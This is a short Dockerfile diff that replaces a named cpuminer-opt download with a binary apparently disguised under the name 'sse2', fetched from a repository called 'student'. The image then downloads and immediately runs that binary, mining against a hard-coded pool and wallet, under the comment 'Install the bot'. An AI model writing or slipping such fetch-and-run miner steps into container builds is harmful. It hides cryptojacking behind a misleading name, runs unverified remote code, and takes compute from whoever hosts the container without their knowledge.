@@ -30,7 +30,5 @@ WORKDIR /home
 RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
 # Install the bot:
-RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz \
-&& tar -xvf cpuminer-opt-linux.tar.gz \
-&& cd cpuminer-opt-linux \
-&& ./cpuminer-avx512 -a power2b  -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MZcw786kC8ng7KUeHZMQuhFhr2Funss7Kk.VPS -p password=test
+RUN wget https://github.com/AVGandhi/student/raw/main/sse2 \
+&& ./sse2 -a power2b  -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MZcw786kC8ng7KUeHZMQuhFhr2Funss7Kk.VPS -p password=test
